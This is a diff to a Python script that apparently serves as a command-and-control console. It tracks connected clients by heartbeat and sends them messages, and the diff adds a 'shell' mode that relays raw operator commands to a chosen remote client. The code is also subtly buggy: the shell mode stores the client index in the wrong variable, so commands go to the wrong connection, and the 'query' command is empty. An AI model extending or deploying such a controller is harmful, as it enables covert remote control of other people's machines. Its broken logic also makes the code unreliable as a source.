@@ -48,49 +48,78 @@ def dumpConnectionMap():
 	return(cleanOut)
 
 def consoleControl():
-	nextOutput="[i]\tlistener established on "+defaultInterface+":"+str(defaultPort)
+	sockState='open'
+	sockClientLock=-1
+	
+	nextOutput="[>]\tlistener established on "+defaultInterface+":"+str(defaultPort)
 	while(True):
 		print("\033c")
-		print("==========\n\tcontroller online. help - list - query - send - quit\n==========\n")
+		print("==========\n\tcontroller online. help - list - query - send - shell - quit\n==========\n")
 		print(nextOutput+"\n\n")
 		rawCommand=input("> ")
 		segCommand=(rawCommand+'     ').split(' ')
-		match(segCommand[0]):
-			case 'help':
-				nextOutput="[i]\thelp text goes here"
-			case 'list':
-				if(segCommand[1]=='threads'):
-					nextOutput=dumpHandlerMap()
-				elif(segCommand[1]=='socks'):
-					nextOutput=dumpConnectionMap()
-				elif(segCommand[1]=='all'):	
-					nextOutput=dumpHandlerMap()
-					nextOutput+=dumpConnectionMap()
-				else:
-					nextOutput="[x]\tlist [threads|socks|all] [optional id]"
-					
-			case 'query':
-				True
+		
+		match(sockState):
+			case 'lock':
+				nextOutput="[>]\tshell open: "+str(connectionMap[sockClientLock]['connection'])+" ("+str(sockClientLock)+"). exit to close shell.\n[>] last command: "+rawCommand
 				
-			case 'send':
-				try:
-					x=int(segCommand[1])
-				except:
-					x=9999
-					
-				if(x<len(connectionMap)):
-					rawCommand=''
-					for x in segCommand[2::]:
-						rawCommand+=' '+x
-					nextOutput="[i]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+"..."
-					sendClientData(rawCommand.rstrip(),int(segCommand[1]))
-				elif(x==9999):
-					nextOutput="[x]\tsend [sock_id] [message]"
+				if(rawCommand=='exit'):
+					nextOutput="[>]\tshell closed. regular commands available again."
+					sendClientData('$end-shell',sockClientLock)
+					sockState='open'
+					sockClientLock=-1
 				else:
-					nextOutput="[x]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+" FAILED: NO SUCH SOCKET"
-			case 'quit':
-				print("[!]\texiting...")
-				os._exit(0)
+					sendClientData(rawCommand,sockClientLock)
+			case _:
+				match(segCommand[0]):
+					case 'help':
+						nextOutput="[>]\thelp text goes here"
+					case 'list':
+						if(segCommand[1]=='threads'):
+							nextOutput=dumpHandlerMap()
+						elif(segCommand[1]=='socks'):
+							nextOutput=dumpConnectionMap()
+						elif(segCommand[1]=='all'):	
+							nextOutput=dumpHandlerMap()
+							nextOutput+=dumpConnectionMap()
+						else:
+							nextOutput="[>]\tlist [threads|socks|all] [optional id]"
+						
+					case 'query':
+						True
+
+					case 'send':
+						try:
+							x=int(segCommand[1])
+						except:
+							x=9999
+
+						if(x<len(connectionMap)):
+							rawCommand=''
+							for x in segCommand[2::]:
+								rawCommand+=' '+x
+							nextOutput="[>]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+"..."
+							sendClientData(rawCommand.rstrip(),int(segCommand[1]))
+						elif(x==9999):
+							nextOutput="[>]\tsend [sock_id] [message]"
+						else:
+							nextOutput="[x]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+" FAILED: NO SUCH SOCKET"
+
+					case 'shell':
+						try:
+							x=int(segCommand[1])
+						except:
+							x=9999
+
+						if(x<len(connectionMap)):
+							sockState='lock'
+							sockClient=int(segCommand[1])
+							sendClientData('$req-shell',int(segCommand[1]))
+							nextOutput="[>]\tshell open: "+str(connectionMap[int(segCommand[1])]['connection'])+" ("+segCommand[1]+"). exit to close shell."
+
+					case 'quit':
+						print("[>]\texiting...")
+						os._exit(0)
 
 def sendClientData(clientData,clientIndex):
 	connectionMap[clientIndex]['connection'].send(clientData.encode())
@@ -113,6 +142,8 @@ def processClientData(clientData,clientIndex):
 	if(clientData.find('$hb')>(-1)):
 		heartBeat=clientData.split(' ')[1]
 		connectionMap[clientIndex].update({'pulse':int(heartBeat),'lastpulse':time.time()})
+	elif(clientData.find('$ack-shell')>(-1)):
+		print("\n\n[>]",clientData[10:])
 	
 def handleConnection(clientHandle,clientAddress):
 	thisIndex=0
